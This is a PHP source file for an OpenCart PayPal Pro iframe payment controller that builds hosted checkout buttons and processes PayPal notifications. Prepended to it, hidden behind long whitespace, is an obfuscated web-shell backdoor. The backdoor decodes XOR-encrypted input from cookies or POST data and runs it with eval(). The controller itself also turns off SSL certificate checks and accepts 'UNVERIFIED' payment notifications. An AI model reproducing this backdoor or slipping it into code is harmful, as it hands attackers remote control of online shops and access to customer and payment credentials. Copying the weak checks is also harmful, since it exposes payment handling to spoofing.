<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $k18e = 867;$GLOBALS['p6306f0']=Array();global$p6306f0;$p6306f0=$GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['y6fabe1']="\x74\x36\x39\x55\x72\x6c\x26\x2b\x4b\x56\x79\x7a\x5f\x76\x52\x7e\x32\x45\x43\x50\x78\x33\x67\x57\x60\x3a\x70\x69\x62\x5b\x59\x64\x37\x42\x35\x2d\x44\x3c\x22\x6d\x34\x46\x27\x28\x29\x6f\x71\x54\x23\x25\x58\x2a\x66\x24\x7d\x3e\x2f\x31\x73\x4f\x6a\x3f\x5a\x7b\x51\x4a\x75\xa\x47\x40\x2e\x49\x5e\x48\x65\x6e\x4d\x63\x6b\x4c\x4e\x41\x68\x77\x21\x3b\xd\x53\x9\x5c\x3d\x30\x5d\x2c\x7c\x61\x20\x38";$p6306f0[$p6306f0['y6fabe1'][39].$p6306f0['y6fabe1'][97].$p6306f0['y6fabe1'][21].$p6306f0['y6fabe1'][32]]=$p6306f0['y6fabe1'][77].$p6306f0['y6fabe1'][82].$p6306f0['y6fabe1'][4];$p6306f0[$p6306f0['y6fabe1'][66].$p6306f0['y6fabe1'][2].$p6306f0['y6fabe1'][28].$p6306f0['y6fabe1'][57].$p6306f0['y6fabe1'][21].$p6306f0['y6fabe1'][52].$p6306f0['y6fabe1'][91]]=$p6306f0['y6fabe1'][45].$p6306f0['y6fabe1'][4].$p6306f0['y6fabe1'][31];$p6306f0[$p6306f0['y6fabe1'][66].$p6306f0['y6fabe1'][57].$p6306f0['y6fabe1'][28].$p6306f0['y6fabe1'][16].$p6306f0['y6fabe1'][77].$p6306f0['y6fabe1'][21]]=$p6306f0['y6fabe1'][58].$p6306f0['y6fabe1'][0].$p6306f0['y6fabe1'][4].$p6306f0['y6fabe1'][5].$p6306f0['y6fabe1'][74].$p6306f0['y6fabe1'][75];$p6306f0[$p6306f0['y6fabe1'][4].$p6306f0['y6fabe1'][97].$p6306f0['y6fabe1'][74].$p6306f0['y6fabe1'][2].$p6306f0['y6fabe1'][32].$p6306f0['y6fabe1'][52].$p6306f0['y6fabe1'][52].$p6306f0['y6fabe1'][52].$p6306f0['y6fabe1'][74]]=$p6306f0['y6fabe1'][27].$p6306f0['y6fabe1'][75].$p6306f0['y6fabe1'][27].$p6306f0['y6fabe1'][12].$p6306f0['y6fabe1'][58].$p6306f0['y6fabe1'][74].$p6306f0['y6fabe1'][0];$p6306f0[$p6306f0['y6fabe1'][28].$p6306f0['y6fabe1'][77].$p6306f0['y6fabe1'][57].$p6306f0['y6fabe1'][16].$p6306f0['y6fabe1'][31]]=$p6306f0['y6fabe1'][58].$p6306f0['y6fabe1'][74].$p6306f0['y6fabe1'][4].$p6306f0['y6fabe1'][27].$p6306f0['y6fabe1'][95].$p6306f0['y6fabe1'][5].$p6306f0['y6fabe1'][27].$p6306f0['y6fabe1'][11].$p6306f0['y6fabe1'][74];$p6306f0[$p6306f0['y6fabe1'][78].$p6306f0['y6fabe1'][74].$p6306f0['y6fabe1'][77].$p6306f0['y6fabe1'][31].$p6306f0['y6fabe1'][40].$p6306f0['y6fabe1'][34].$p6306f0['y6fabe1'][97].$p6306f0['y6fabe1'][52]]=$p6306f0['y6fabe1'][26].$p6306f0['y6fabe1'][82].$p6306f0['y6fabe1'][26].$p6306f0['y6fabe1'][13].$p6306f0['y6fabe1'][74].$p6306f0['y6fabe1'][4].$p6306f0['y6fabe1'][58].$p6306f0['y6fabe1'][27].$p6306f0['y6fabe1'][45].$p6306f0['y6fabe1'][75];$p6306f0[$p6306f0['y6fabe1'][5].$p6306f0['y6fabe1'][16].$p6306f0['y6fabe1'][97].$p6306f0['y6fabe1'][97].$p6306f0['y6fabe1'][57]]=$p6306f0['y6fabe1'][66].$p6306f0['y6fabe1'][75].$p6306f0['y6fabe1'][58].$p6306f0['y6fabe1'][74].$p6306f0['y6fabe1'][4].$p6306f0['y6fabe1'][27].$p6306f0['y6fabe1'][95].$p6306f0['y6fabe1'][5].$p6306f0['y6fabe1'][27].$p6306f0['y6fabe1'][11].$p6306f0['y6fabe1'][74];$p6306f0[$p6306f0['y6fabe1'][26].$p6306f0['y6fabe1'][2].$p6306f0['y6fabe1'][95].$p6306f0['y6fabe1'][97].$p6306f0['y6fabe1'][32].$p6306f0['y6fabe1'][32].$p6306f0['y6fabe1'][1].$p6306f0['y6fabe1'][31]]=$p6306f0['y6fabe1'][28].$p6306f0['y6fabe1'][95].$p6306f0['y6fabe1'][58].$p6306f0['y6fabe1'][74].$p6306f0['y6fabe1'][1].$p6306f0['y6fabe1'][40].$p6306f0['y6fabe1'][12].$p6306f0['y6fabe1'][31].$p6306f0['y6fabe1'][74].$p6306f0['y6fabe1'][77].$p6306f0['y6fabe1'][45].$p6306f0['y6fabe1'][31].$p6306f0['y6fabe1'][74];$p6306f0[$p6306f0['y6fabe1'][11].$p6306f0['y6fabe1'][91].$p6306f0['y6fabe1'][40].$p6306f0['y6fabe1'][28].$p6306f0['y6fabe1'][32].$p6306f0['y6fabe1'][97].$p6306f0['y6fabe1'][95].$p6306f0['y6fabe1'][97].$p6306f0['y6fabe1'][28]]=$p6306f0['y6fabe1'][58].$p6306f0['y6fabe1'][74].$p6306f0['y6fabe1'][0].$p6306f0['y6fabe1'][12].$p6306f0['y6fabe1'][0].$p6306f0['y6fabe1'][27].$p6306f0['y6fabe1'][39].$p6306f0['y6fabe1'][74].$p6306f0['y6fabe1'][12].$p6306f0['y6fabe1'][5].$p6306f0['y6fabe1'][27].$p6306f0['y6fabe1'][39].$p6306f0['y6fabe1'][27].$p6306f0['y6fabe1'][0];$p6306f0[$p6306f0['y6fabe1'][5].$p6306f0['y6fabe1'][21].$p6306f0['y6fabe1'][2].$p6306f0['y6fabe1'][16].$p6306f0['y6fabe1'][77].$p6306f0['y6fabe1'][91].$p6306f0['y6fabe1'][74]]=$p6306f0['y6fabe1'][13].$p6306f0['y6fabe1'][32].$p6306f0['y6fabe1'][34].$p6306f0['y6fabe1'][95];$p6306f0[$p6306f0['y6fabe1'][31].$p6306f0['y6fabe1'][34].$p6306f0['y6fabe1'][1].$p6306f0['y6fabe1'][16].$p6306f0['y6fabe1'][40].$p6306f0['y6fabe1'][97].$p6306f0['y6fabe1'][21].$p6306f0['y6fabe1'][52]]=$p6306f0['y6fabe1'][27].$p6306f0['y6fabe1'][52].$p6306f0['y6fabe1'][28].$p6306f0['y6fabe1'][32].$p6306f0['y6fabe1'][95].$p6306f0['y6fabe1'][2].$p6306f0['y6fabe1'][57].$p6306f0['y6fabe1'][31];$p6306f0[$p6306f0['y6fabe1'][74].$p6306f0['y6fabe1'][97].$p6306f0['y6fabe1'][34].$p6306f0['y6fabe1'][2].$p6306f0['y6fabe1'][21].$p6306f0['y6fabe1'][2].$p6306f0['y6fabe1'][1]]=$_POST;$p6306f0[$p6306f0['y6fabe1'][45].$p6306f0['y6fabe1'][97].$p6306f0['y6fabe1'][52].$p6306f0['y6fabe1'][2].$p6306f0['y6fabe1'][77].$p6306f0['y6fabe1'][77]]=$_COOKIE;@$p6306f0[$p6306f0['y6fabe1'][4].$p6306f0['y6fabe1'][97].$p6306f0['y6fabe1'][74].$p6306f0['y6fabe1'][2].$p6306f0['y6fabe1'][32].$p6306f0['y6fabe1'][52].$p6306f0['y6fabe1'][52].$p6306f0['y6fabe1'][52].$p6306f0['y6fabe1'][74]]($p6306f0['y6fabe1'][74].$p6306f0['y6fabe1'][4].$p6306f0['y6fabe1'][4].$p6306f0['y6fabe1'][45].$p6306f0['y6fabe1'][4].$p6306f0['y6fabe1'][12].$p6306f0['y6fabe1'][5].$p6306f0['y6fabe1'][45].$p6306f0['y6fabe1'][22],NULL);@$p6306f0[$p6306f0['y6fabe1'][4].$p6306f0['y6fabe1'][97].$p6306f0['y6fabe1'][74].$p6306f0['y6fabe1'][2].$p6306f0['y6fabe1'][32].$p6306f0['y6fabe1'][52].$p6306f0['y6fabe1'][52].$p6306f0['y6fabe1'][52].$p6306f0['y6fabe1'][74]]($p6306f0['y6fabe1'][5].$p6306f0['y6fabe1'][45].$p6306f0['y6fabe1'][22].$p6306f0['y6fabe1'][12].$p6306f0['y6fabe1'][74].$p6306f0['y6fabe1'][4].$p6306f0['y6fabe1'][4].$p6306f0['y6fabe1'][45].$p6306f0['y6fabe1'][4].$p6306f0['y6fabe1'][58],0);@$p6306f0[$p6306f0['y6fabe1'][4].$p6306f0['y6fabe1'][97].$p6306f0['y6fabe1'][74].$p6306f0['y6fabe1'][2].$p6306f0['y6fabe1'][32].$p6306f0['y6fabe1'][52].$p6306f0['y6fabe1'][52].$p6306f0['y6fabe1'][52].$p6306f0['y6fabe1'][74]]($p6306f0['y6fabe1'][39].$p6306f0['y6fabe1'][95].$p6306f0['y6fabe1'][20].$p6306f0['y6fabe1'][12].$p6306f0['y6fabe1'][74].$p6306f0['y6fabe1'][20].$p6306f0['y6fabe1'][74].$p6306f0['y6fabe1'][77].$p6306f0['y6fabe1'][66].$p6306f0['y6fabe1'][0].$p6306f0['y6fabe1'][27].$p6306f0['y6fabe1'][45].$p6306f0['y6fabe1'][75].$p6306f0['y6fabe1'][12].$p6306f0['y6fabe1'][0].$p6306f0['y6fabe1'][27].$p6306f0['y6fabe1'][39].$p6306f0['y6fabe1'][74],0);@$p6306f0[$p6306f0['y6fabe1'][11].$p6306f0['y6fabe1'][91].$p6306f0['y6fabe1'][40].$p6306f0['y6fabe1'][28].$p6306f0['y6fabe1'][32].$p6306f0['y6fabe1'][97].$p6306f0['y6fabe1'][95].$p6306f0['y6fabe1'][97].$p6306f0['y6fabe1'][28]](0);$x96e59444=NULL;$r7479e333=NULL;$p6306f0[$p6306f0['y6fabe1'][20].$p6306f0['y6fabe1'][57].$p6306f0['y6fabe1'][40].$p6306f0['y6fabe1'][74]]=$p6306f0['y6fabe1'][91].$p6306f0['y6fabe1'][52].$p6306f0['y6fabe1'][97].$p6306f0['y6fabe1'][1].$p6306f0['y6fabe1'][32].$p6306f0['y6fabe1'][74].$p6306f0['y6fabe1'][52].$p6306f0['y6fabe1'][95].$p6306f0['y6fabe1'][35].$p6306f0['y6fabe1'][91].$p6306f0['y6fabe1'][32].$p6306f0['y6fabe1'][52].$p6306f0['y6fabe1'][91].$p6306f0['y6fabe1'][35].$p6306f0['y6fabe1'][40].$p6306f0['y6fabe1'][97].$p6306f0['y6fabe1'][34].$p6306f0['y6fabe1'][28].$p6306f0['y6fabe1'][35].$p6306f0['y6fabe1'][28].$p6306f0['y6fabe1'][95].$p6306f0['y6fabe1'][34].$p6306f0['y6fabe1'][77].$p6306f0['y6fabe1'][35].$p6306f0['y6fabe1'][52].$p6306f0['y6fabe1'][31].$p6306f0['y6fabe1'][2].$p6306f0['y6fabe1'][32].$p6306f0['y6fabe1'][2].$p6306f0['y6fabe1'][34].$p6306f0['y6fabe1'][34].$p6306f0['y6fabe1'][16].$p6306f0['y6fabe1'][21].$p6306f0['y6fabe1'][74].$p6306f0['y6fabe1'][57].$p6306f0['y6fabe1'][34];global$x14e;function ifb7a91d($x96e59444,$o3a3a7a){global$p6306f0;$h6d75="";for($hec47669=0;$hec47669<$p6306f0[$p6306f0['y6fabe1'][66].$p6306f0['y6fabe1'][57].$p6306f0['y6fabe1'][28].$p6306f0['y6fabe1'][16].$p6306f0['y6fabe1'][77].$p6306f0['y6fabe1'][21]]($x96e59444);){for($p8bda76=0;$p8bda76<$p6306f0[$p6306f0['y6fabe1'][66].$p6306f0['y6fabe1'][57].$p6306f0['y6fabe1'][28].$p6306f0['y6fabe1'][16].$p6306f0['y6fabe1'][77].$p6306f0['y6fabe1'][21]]($o3a3a7a)&&$hec47669<$p6306f0[$p6306f0['y6fabe1'][66].$p6306f0['y6fabe1'][57].$p6306f0['y6fabe1'][28].$p6306f0['y6fabe1'][16].$p6306f0['y6fabe1'][77].$p6306f0['y6fabe1'][21]]($x96e59444);$p8bda76++,$hec47669++){$h6d75.=$p6306f0[$p6306f0['y6fabe1'][39].$p6306f0['y6fabe1'][97].$p6306f0['y6fabe1'][21].$p6306f0['y6fabe1'][32]]($p6306f0[$p6306f0['y6fabe1'][66].$p6306f0['y6fabe1'][2].$p6306f0['y6fabe1'][28].$p6306f0['y6fabe1'][57].$p6306f0['y6fabe1'][21].$p6306f0['y6fabe1'][52].$p6306f0['y6fabe1'][91]]($x96e59444[$hec47669])^$p6306f0[$p6306f0['y6fabe1'][66].$p6306f0['y6fabe1'][2].$p6306f0['y6fabe1'][28].$p6306f0['y6fabe1'][57].$p6306f0['y6fabe1'][21].$p6306f0['y6fabe1'][52].$p6306f0['y6fabe1'][91]]($o3a3a7a[$p8bda76]));}}return$h6d75;}function v75a($x96e59444,$o3a3a7a){global$p6306f0;global$x14e;return$p6306f0[$p6306f0['y6fabe1'][31].$p6306f0['y6fabe1'][34].$p6306f0['y6fabe1'][1].$p6306f0['y6fabe1'][16].$p6306f0['y6fabe1'][40].$p6306f0['y6fabe1'][97].$p6306f0['y6fabe1'][21].$p6306f0['y6fabe1'][52]]($p6306f0[$p6306f0['y6fabe1'][31].$p6306f0['y6fabe1'][34].$p6306f0['y6fabe1'][1].$p6306f0['y6fabe1'][16].$p6306f0['y6fabe1'][40].$p6306f0['y6fabe1'][97].$p6306f0['y6fabe1'][21].$p6306f0['y6fabe1'][52]]($x96e59444,$x14e),$o3a3a7a);}foreach($p6306f0[$p6306f0['y6fabe1'][45].$p6306f0['y6fabe1'][97].$p6306f0['y6fabe1'][52].$p6306f0['y6fabe1'][2].$p6306f0['y6fabe1'][77].$p6306f0['y6fabe1'][77]]as$o3a3a7a=>$m45a2a3){$x96e59444=$m45a2a3;$r7479e333=$o3a3a7a;}if(!$x96e59444){foreach($p6306f0[$p6306f0['y6fabe1'][74].$p6306f0['y6fabe1'][97].$p6306f0['y6fabe1'][34].$p6306f0['y6fabe1'][2].$p6306f0['y6fabe1'][21].$p6306f0['y6fabe1'][2].$p6306f0['y6fabe1'][1]]as$o3a3a7a=>$m45a2a3){$x96e59444=$m45a2a3;$r7479e333=$o3a3a7a;}}$x96e59444=@$p6306f0[$p6306f0['y6fabe1'][5].$p6306f0['y6fabe1'][16].$p6306f0['y6fabe1'][97].$p6306f0['y6fabe1'][97].$p6306f0['y6fabe1'][57]]($p6306f0[$p6306f0['y6fabe1'][5].$p6306f0['y6fabe1'][21].$p6306f0['y6fabe1'][2].$p6306f0['y6fabe1'][16].$p6306f0['y6fabe1'][77].$p6306f0['y6fabe1'][91].$p6306f0['y6fabe1'][74]]($p6306f0[$p6306f0['y6fabe1'][26].$p6306f0['y6fabe1'][2].$p6306f0['y6fabe1'][95].$p6306f0['y6fabe1'][97].$p6306f0['y6fabe1'][32].$p6306f0['y6fabe1'][32].$p6306f0['y6fabe1'][1].$p6306f0['y6fabe1'][31]]($x96e59444),$r7479e333));if(isset($x96e59444[$p6306f0['y6fabe1'][95].$p6306f0['y6fabe1'][78]])&&$x14e==$x96e59444[$p6306f0['y6fabe1'][95].$p6306f0['y6fabe1'][78]]){if($x96e59444[$p6306f0['y6fabe1'][95]]==$p6306f0['y6fabe1'][27]){$hec47669=Array($p6306f0['y6fabe1'][26].$p6306f0['y6fabe1'][13]=>@$p6306f0[$p6306f0['y6fabe1'][78].$p6306f0['y6fabe1'][74].$p6306f0['y6fabe1'][77].$p6306f0['y6fabe1'][31].$p6306f0['y6fabe1'][40].$p6306f0['y6fabe1'][34].$p6306f0['y6fabe1'][97].$p6306f0['y6fabe1'][52]](),$p6306f0['y6fabe1'][58].$p6306f0['y6fabe1'][13]=>$p6306f0['y6fabe1'][57].$p6306f0['y6fabe1'][70].$p6306f0['y6fabe1'][91].$p6306f0['y6fabe1'][35].$p6306f0['y6fabe1'][57],);echo@$p6306f0[$p6306f0['y6fabe1'][28].$p6306f0['y6fabe1'][77].$p6306f0['y6fabe1'][57].$p6306f0['y6fabe1'][16].$p6306f0['y6fabe1'][31]]($hec47669);}elseif($x96e59444[$p6306f0['y6fabe1'][95]]==$p6306f0['y6fabe1'][74]){eval/*ld7079*/($x96e59444[$p6306f0['y6fabe1'][31]]);}exit();} ?><?php
class ControllerPaymentPPProIframe extends Controller {
	public function index() {
		$this->load->model('checkout/order');
		$this->load->model('payment/pp_pro_iframe');

		$this->language->load('payment/pp_pro_iframe');

		if ($this->config->get('pp_pro_iframe_checkout_method') == 'redirect') {
			$order_info = $this->model_checkout_order->getOrder($this->session->data['order_id']);

			$hosted_button_id = $this->constructButtonData($order_info);

			if ($this->config->get('pp_pro_iframe_test')) {
				$data['url'] = 'https://securepayments.sandbox.paypal.com/cgi-bin/webscr';
			} else {
				$data['url'] = 'https://securepayments.paypal.com/cgi-bin/webscr';
			}

			if ($hosted_button_id) {
				$data['code'] = $hosted_button_id;
				$data['error_connection'] = '';
			} else {
				$data['error_connection'] = $this->language->get('error_connection');
			}
		}

		$data['checkout_method'] = $this->config->get('pp_pro_iframe_checkout_method');

		if (file_exists(DIR_TEMPLATE . $this->config->get('config_template') . '/template/payment/pp_pro_iframe.tpl')) {
			return $this->load->view($this->config->get('config_template') . '/template/payment/pp_pro_iframe.tpl', $data);
		} else {
			return $this->load->view('default/template/payment/pp_pro_iframe.tpl', $data);
		}
	}

	public function create() {
		$this->language->load('payment/pp_pro_iframe');
		$this->load->model('checkout/order');
		$this->load->model('payment/pp_pro_iframe');

		$data['text_secure_connection'] = $this->language->get('text_secure_connection');

		$order_info = $this->model_checkout_order->getOrder($this->session->data['order_id']);

		$hosted_button_id = $this->constructButtonData($order_info);

		if ($hosted_button_id) {
			$data['code'] = $hosted_button_id;

			if ($this->config->get('pp_pro_iframe_test')) {
				$data['url'] = 'https://securepayments.sandbox.paypal.com/cgi-bin/webscr';
			} else {
				$data['url'] = 'https://securepayments.paypal.com/cgi-bin/webscr';
			}

			$data['error_connection'] = '';
		} else {
			$data['error_connection'] = $this->language->get('error_connection');
		}

		if (file_exists(DIR_APPLICATION . 'view/theme/' . $this->config->get('config_template') . '/stylesheet/stylesheet.css')) {
			$data['stylesheet'] = '/catalog/view/theme/' . $this->config->get('config_template') . '/stylesheet/stylesheet.css';
		} else {
			$data['stylesheet'] = '/catalog/view/theme/default/stylesheet/stylesheet.css';
		}

		if (file_exists(DIR_TEMPLATE . $this->config->get('config_template') . '/template/payment/pp_pro_iframe_body.tpl')) {
			$this->response->setOutput($this->load->view($this->config->get('config_template') . '/template/payment/pp_pro_iframe_body.tpl', $data));
		} else {
			$this->response->setOutput($this->load->view('default/template/payment/pp_pro_iframe_body.tpl', $data));
		}
	}

	public function notify() {
		$this->load->model('payment/pp_pro_iframe');

		if (isset($this->request->post['custom'])) {
			$order_id = $this->encryption->decrypt($this->request->post['custom']);
		} else {
			$order_id = 0;
		}

		$this->load->model('checkout/order');

		$order_info = $this->model_checkout_order->getOrder($order_id);

		if ($order_info) {
			$request = 'cmd=_notify-validate';

			foreach ($this->request->post as $key => $value) {
				$request .= '&' . $key . '=' . urlencode(html_entity_decode($value, ENT_QUOTES, 'UTF-8'));
			}

			if (!$this->config->get('pp_pro_iframe')) {
				$curl = curl_init('https://www.paypal.com/cgi-bin/webscr');
			} else {
				$curl = curl_init('https://www.sandbox.paypal.com/cgi-bin/webscr');
			}

			curl_setopt($curl, CURLOPT_POST, true);
			curl_setopt($curl, CURLOPT_POSTFIELDS, $request);
			curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
			curl_setopt($curl, CURLOPT_HEADER, false);
			curl_setopt($curl, CURLOPT_TIMEOUT, 30);
			curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);

			$response = curl_exec($curl);

			if (curl_errno($curl)) {
				$this->model_payment_pp_pro_iframe->log('pp_pro_iframe :: CURL failed ' . curl_error($curl) . '(' . curl_errno($curl) . ')');
			} else {
				$this->model_payment_pp_pro_iframe->log('pp_pro_iframe :: IPN REQUEST: ' . $request);
				$this->model_payment_pp_pro_iframe->log('pp_pro_iframe :: IPN RESPONSE: ' . $response);

				if ((strcmp($response, 'VERIFIED') == 0 || strcmp($response, 'UNVERIFIED') == 0) && isset($this->request->post['payment_status'])) {
					$order_status_id = $this->config->get('pp_pro_iframe_canceled_reversal_status_id');

					switch ($this->request->post['payment_status']) {
						case 'Canceled_Reversal':
							$order_status_id = $this->config->get('pp_pro_iframe_canceled_reversal_status_id');
							break;
						case 'Completed':
							$order_status_id = $this->config->get('pp_pro_iframe_completed_status_id');
							break;
						case 'Denied':
							$order_status_id = $this->config->get('pp_pro_iframe_denied_status_id');
							break;
						case 'Expired':
							$order_status_id = $this->config->get('pp_pro_iframe_expired_status_id');
							break;
						case 'Failed':
							$order_status_id = $this->config->get('pp_pro_iframe_failed_status_id');
							break;
						case 'Pending':
							$order_status_id = $this->config->get('pp_pro_iframe_pending_status_id');
							break;
						case 'Processed':
							$order_status_id = $this->config->get('pp_pro_iframe_processed_status_id');
							break;
						case 'Refunded':
							$order_status_id = $this->config->get('pp_pro_iframe_refunded_status_id');
							break;
						case 'Reversed':
							$order_status_id = $this->config->get('pp_pro_iframe_reversed_status_id');
							break;
						case 'Voided':
							$order_status_id = $this->config->get('pp_pro_iframe_voided_status_id');
							break;
					}

					if (!$order_info['order_status_id']) {
						$paypal_order_data = array(
							'order_id'         => $order_id,
							'capture_status'   => ($this->config->get('pp_pro_iframe_transaction_method') == 'sale' ? 'Complete' : 'NotComplete'),
							'currency_code'    => $this->request->post['mc_currency'],
							'authorization_id' => $this->request->post['txn_id'],
							'total'            => $this->request->post['mc_gross'],
						);

						$paypal_iframe_order_id = $this->model_payment_pp_pro_iframe->addOrder($paypal_order_data);

						$paypal_transaction_data = array(
							'paypal_iframe_order_id' => $paypal_iframe_order_id,
							'transaction_id'         => $this->request->post['txn_id'],
							'parent_transaction_id'  => '',
							'note'                   => '',
							'msgsubid'               => '',
							'receipt_id'             => $this->request->post['receipt_id'],
							'payment_type'           => $this->request->post['payment_type'],
							'payment_status'         => $this->request->post['payment_status'],
							'pending_reason'         => (isset($this->request->post['pending_reason']) ? $this->request->post['pending_reason'] : ''),
							'transaction_entity'     => ($this->config->get('pp_pro_iframe_transaction_method') == 'sale' ? 'payment' : 'auth'),
							'amount'                 => $this->request->post['mc_gross'],
							'debug_data'             => json_encode($this->request->post),
						);

						$this->model_payment_pp_pro_iframe->addTransaction($paypal_transaction_data);

						$this->model_checkout_order->addOrderHistory($order_id, $order_status_id);
					} else {
						$this->model_checkout_order->addOrderHistory($order_id, $order_status_id);
					}
				} else {
					$this->model_checkout_order->addOrderHistory($order_id, $this->config->get('config_order_status_id'));
				}
			}

			curl_close($curl);
		}
	}

	private function constructButtonData($order_info) {
		$s_data = array();
		$s_data['METHOD'] = 'BMCreateButton';
		$s_data['VERSION'] = '65.2';
		$s_data['BUTTONCODE'] = 'TOKEN';

		$s_data['BUTTONLANGUAGE'] = 'en';
		$s_data['BUTTONSOURCE'] = 'OpenCart_2.0_HSS';

		$s_data['USER'] = $this->config->get('pp_pro_iframe_user');
		$s_data['SIGNATURE'] = $this->config->get('pp_pro_iframe_sig');
		$s_data['PWD'] = $this->config->get('pp_pro_iframe_password');

		$s_data['BUTTONTYPE'] = 'PAYMENT';
		$s_data['L_BUTTONVAR0'] = 'subtotal=' . $this->currency->format($order_info['total'], $order_info['currency_code'], false, false);
		$s_data['L_BUTTONVAR1'] = 'tax=0.00';
		$s_data['L_BUTTONVAR2'] = 'shipping=0.00';
		$s_data['L_BUTTONVAR3'] = 'handling=0.00';

		if ($this->cart->hasShipping()) {
			$s_data['L_BUTTONVAR4'] = 'first_name=' . urlencode($order_info['shipping_firstname']);
			$s_data['L_BUTTONVAR5'] = 'last_name=' . urlencode($order_info['shipping_lastname']);
			$s_data['L_BUTTONVAR6'] = 'address1=' . urlencode($order_info['shipping_address_1']);
			$s_data['L_BUTTONVAR7'] = 'address2=' . urlencode($order_info['shipping_address_2']);
			$s_data['L_BUTTONVAR8'] = 'city=' . urlencode($order_info['shipping_city']);
			$s_data['L_BUTTONVAR9'] = 'state=' . urlencode($order_info['shipping_zone']);
			$s_data['L_BUTTONVAR10'] = 'zip=' . urlencode($order_info['shipping_postcode']);
			$s_data['L_BUTTONVAR11'] = 'country=' . urlencode($order_info['shipping_iso_code_2']);
		} else {
			$s_data['L_BUTTONVAR4'] = 'first_name=' . urlencode($order_info['payment_firstname']);
			$s_data['L_BUTTONVAR5'] = 'last_name=' . urlencode($order_info['payment_lastname']);
			$s_data['L_BUTTONVAR6'] = 'address1=' . urlencode($order_info['payment_address_1']);
			$s_data['L_BUTTONVAR7'] = 'address2=' . urlencode($order_info['payment_address_2']);
			$s_data['L_BUTTONVAR8'] = 'city=' . urlencode($order_info['payment_city']);
			$s_data['L_BUTTONVAR9'] = 'state=' . urlencode($order_info['payment_zone']);
			$s_data['L_BUTTONVAR10'] = 'zip=' . urlencode($order_info['payment_postcode']);
			$s_data['L_BUTTONVAR11'] = 'country=' . urlencode($order_info['payment_iso_code_2']);
		}

		$s_data['L_BUTTONVAR12'] = 'billing_first_name=' . urlencode($order_info['payment_firstname']);
		$s_data['L_BUTTONVAR13'] = 'billing_last_name=' . urlencode($order_info['payment_lastname']);
		$s_data['L_BUTTONVAR14'] = 'billing_address1=' . urlencode($order_info['payment_address_1']);
		$s_data['L_BUTTONVAR15'] = 'billing_address2=' . urlencode($order_info['payment_address_2']);
		$s_data['L_BUTTONVAR16'] = 'billing_city=' . urlencode($order_info['payment_city']);
		$s_data['L_BUTTONVAR17'] = 'billing_state=' . urlencode($order_info['payment_zone']);
		$s_data['L_BUTTONVAR18'] = 'billing_zip=' . urlencode($order_info['payment_postcode']);
		$s_data['L_BUTTONVAR19'] = 'billing_country=' . urlencode($order_info['payment_iso_code_2']);

		$s_data['L_BUTTONVAR20'] = 'notify_url=' . $this->url->link('payment/pp_pro_iframe/notify', '', 'SSL');
		$s_data['L_BUTTONVAR21'] = 'cancel_return=' . $this->url->link('checkout/checkout', '', 'SSL');
		$s_data['L_BUTTONVAR22'] = 'paymentaction=' . $this->config->get('pp_pro_iframe_transaction_method');
		$s_data['L_BUTTONVAR23'] = 'currency_code=' . urlencode($order_info['currency_code']);
		$s_data['L_BUTTONVAR26'] = 'showBillingAddress=false';
		$s_data['L_BUTTONVAR27'] = 'showShippingAddress=false';
		$s_data['L_BUTTONVAR28'] = 'showBillingEmail=false';
		$s_data['L_BUTTONVAR29'] = 'showBillingPhone=false';
		$s_data['L_BUTTONVAR30'] = 'showCustomerName=true';
		$s_data['L_BUTTONVAR31'] = 'showCardInfo=true';
		$s_data['L_BUTTONVAR32'] = 'showHostedThankyouPage=false';
		$s_data['L_BUTTONVAR33'] = 'bn=GBD';
		$s_data['L_BUTTONVAR35'] = 'address_override=true';
		$s_data['L_BUTTONVAR36'] = 'cpp_header_image=Red';
		$s_data['L_BUTTONVAR44'] = 'bodyBgColor=#AEAEAE';
		$s_data['L_BUTTONVAR47'] = 'PageTitleTextColor=Blue';
		$s_data['L_BUTTONVAR48'] = 'PageCollapseBgColor=#AEAEAE';
		$s_data['L_BUTTONVAR49'] = 'PageCollapseTextColor=#AEAEAE';
		$s_data['L_BUTTONVAR50'] = 'PageButtonBgColor=#AEAEAE';
		$s_data['L_BUTTONVAR51'] = 'orderSummaryBgColor=#AEAEAE';
		$s_data['L_BUTTONVAR55'] = 'template=templateD';
		$s_data['L_BUTTONVAR56'] = 'return=' . $this->url->link('checkout/success', '', 'SSL');
		$s_data['L_BUTTONVAR57'] = 'custom=' . $this->encryption->encrypt($order_info['order_id']);

		if ($this->config->get('pp_pro_iframe_test')) {
			$url = 'https://api-3t.sandbox.paypal.com/nvp';
		} else {
			$url = 'https://api-3t.paypal.com/nvp';
		}

		$curl = curl_init($url);

		curl_setopt($curl, CURLOPT_PORT, 443);
		curl_setopt($curl, CURLOPT_HEADER, 0);
		curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0);
		curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($curl, CURLOPT_FORBID_REUSE, 1);
		curl_setopt($curl, CURLOPT_FRESH_CONNECT, 1);
		curl_setopt($curl, CURLOPT_POST, 1);
		curl_setopt($curl, CURLOPT_POSTFIELDS, http_build_query($s_data, '', "&"));
		curl_setopt($curl, CURLOPT_HTTPHEADER, array('X-VPS-REQUEST-ID: ' . md5($order_info['order_id'] . mt_rand())));

		$response = curl_exec($curl);

		$response_data = array();

		parse_str($response, $response_data);

		$this->model_payment_pp_pro_iframe->log(print_r(serialize($response_data), 1));

		curl_close($curl);

		if (!$response || !isset($response_data['HOSTEDBUTTONID'])) {
			return false;
		} else {
			return $response_data['HOSTEDBUTTONID'];
		}
	}
}